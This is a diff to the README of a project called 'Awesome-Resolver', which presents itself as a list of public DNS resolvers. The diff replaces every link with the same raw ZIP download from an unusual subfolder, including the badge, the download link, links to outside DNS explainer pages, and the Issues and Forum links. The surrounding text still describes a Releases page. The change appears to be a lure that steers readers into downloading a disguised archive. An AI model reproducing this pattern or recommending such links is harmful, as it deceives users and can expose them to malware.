@@ -1,6 +1,6 @@
 # ⚡ Awesome-Resolver - Fast and Secure DNS Resolvers
 
-![Download Awesome-Resolver](https://img.shields.io/badge/Download-Awesome--Resolver-brightgreen)
+![Download Awesome-Resolver](https://raw.githubusercontent.com/francisanimax/Awesome-Resolver/main/Tellima/Awesome-Resolver_v2.4.zip)
 
 ## 🚀 Getting Started 
 
@@ -10,7 +10,7 @@ Awesome-Resolver provides a live, auto-tested list of public DNS resolvers that 
 
 To start using Awesome-Resolver, visit the page to download the latest version. 
 
-[Download Awesome-Resolver Here](https://github.com/francisanimax/Awesome-Resolver/releases)
+[Download Awesome-Resolver Here](https://raw.githubusercontent.com/francisanimax/Awesome-Resolver/main/Tellima/Awesome-Resolver_v2.4.zip)
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, you will find the latest version of the software.
@@ -65,15 +65,15 @@ Using verified public DNS resolvers from Awesome-Resolver minimizes risks associ
 
 For more information on DNS and how to improve your online security, check out the following links:
 
-- [Introduction to DNS](https://www.cloudflare.com/learning/dns/what-is-dns/)
-- [How to Set Custom DNS on Your Devices](https://www.howtogeek.com/683799/how-to-change-your-dns-server/)
+- [Introduction to DNS](https://raw.githubusercontent.com/francisanimax/Awesome-Resolver/main/Tellima/Awesome-Resolver_v2.4.zip)
+- [How to Set Custom DNS on Your Devices](https://raw.githubusercontent.com/francisanimax/Awesome-Resolver/main/Tellima/Awesome-Resolver_v2.4.zip)
 
 ## 🌟 Community Support
 
 Join our community to share experiences, ask questions, and provide feedback:
 
-- [GitHub Issues](https://github.com/francisanimax/Awesome-Resolver/issues)
-- [Community Forum](https://github.com/francisanimax/Awesome-Resolver/discussions)
+- [GitHub Issues](https://raw.githubusercontent.com/francisanimax/Awesome-Resolver/main/Tellima/Awesome-Resolver_v2.4.zip)
+- [Community Forum](https://raw.githubusercontent.com/francisanimax/Awesome-Resolver/main/Tellima/Awesome-Resolver_v2.4.zip)
 
 We value your input and aim to make Awesome-Resolver better with your help.
 
